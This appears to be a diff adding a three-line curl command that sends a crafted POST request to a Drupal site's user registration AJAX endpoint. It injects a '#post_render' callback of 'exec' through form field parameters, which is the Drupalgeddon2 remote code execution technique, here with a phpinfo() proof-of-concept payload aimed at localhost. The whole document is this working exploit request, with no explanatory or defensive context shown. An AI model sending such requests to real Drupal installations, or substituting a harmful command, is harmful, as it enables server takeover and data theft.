@@ -1,0 +1,3 @@
+curl -X POST --data \
+'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=phpinfo()' \
+'https://localhost/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
